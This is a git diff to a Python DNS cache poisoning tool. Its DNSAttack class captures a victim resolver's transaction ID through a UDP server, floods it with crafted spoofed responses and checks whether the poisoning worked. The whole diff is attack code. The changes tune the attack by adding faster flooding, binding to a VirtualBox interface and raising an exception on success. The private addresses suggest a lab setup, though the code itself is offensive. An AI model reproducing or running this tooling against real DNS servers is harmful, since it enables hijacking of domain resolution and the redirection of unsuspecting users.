@@ -11,7 +11,7 @@ import socket
 import sys
 import signal
 from blessings import Terminal #For terminal colors
-from multiprocessing.pool import ThreadPool
+from multiprocessing.pool import ThreadPool, Pool
 import logging
 import threading
 from threading import Thread
@@ -57,6 +57,11 @@ class DNSAttack:
     class InitialQueryFailed(Exception):
         pass
 
+    class CriticalError(Exception):
+        pass
+
+    class SuccessfulAttack(Exception):
+        pass
 
     ## Start UDP Server
     #   @brief Start an UDP server on specified port and return the fetched TXID
@@ -72,11 +77,11 @@ class DNSAttack:
 
         while True:
             data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
-            print("Received response:", data)
+            #print("Received response:", data)
             received_id = data[0:2]
 
             initial_id = int.from_bytes(received_id, byteorder='big')
-            print("ID: ", initial_id)
+            #print("ID: ", initial_id)
 
             sock.close()
             return initial_id
@@ -117,6 +122,7 @@ class DNSAttack:
 
         succeded = False
 
+
         while number_of_tries and not succeded:
 
             time.sleep(3)
@@ -136,7 +142,7 @@ class DNSAttack:
             except self.InitialQueryFailed:
                 self.log("\n{t.red}Unable to get inital TXID, terminating...{t.normal}".format(t=self.t))
                 pool.terminate()    #Terminate the UDP server
-                sys.exit(-1)
+                raise self.CriticalError
 
             fetched_id = async_id_result.get()  # get the return value from your function.
 
@@ -147,23 +153,34 @@ class DNSAttack:
 
             poison= DNSPoisoning(self.victim_server_ip, self.domain, '192.168.56.1', '10.0.0.1', fetched_id,interrupt_handler=self.sigint_handler, log=self.log, blessing_terminal=self.t)
 
+            poison.set_interface('vboxnet0')
+            poison.open_socket()
 
             #Attach SIGINT signal to the DNSPoisoning stop handler
             signal.signal(signal.SIGINT, poison.stop_handler)
 
+            #Executing more request in order increase guessing chance
+            #pool = Pool(processes=10)
+            #pool.apply_async(poison.send_inital_query())
+            #for count in range(2):
+            #    poison.send_inital_query()
 
-            poison.send_inital_query()
+            #poison.send_inital_query()
 
             self.log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...".format(t=self.t))
 
-            poison.start_flooding()
+            #poison.start_flooding()
+
+            poison.faster_flooding()
 
             time.sleep(5)
 
             self.log("Checking the attack results")
             if poison.check_poisoning():
-                self.log("\n\nAttack Succeded!!!!")
+                self.log("\n\n{t.green}Attack Succeded{t.normal}!!!!".format(t=self.t))
                 succeded = True
+                time.sleep(2)
+                raise self.SuccessfulAttack
             else:
                 self.log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!".format(t=self.t))
                 number_of_tries = number_of_tries - 1
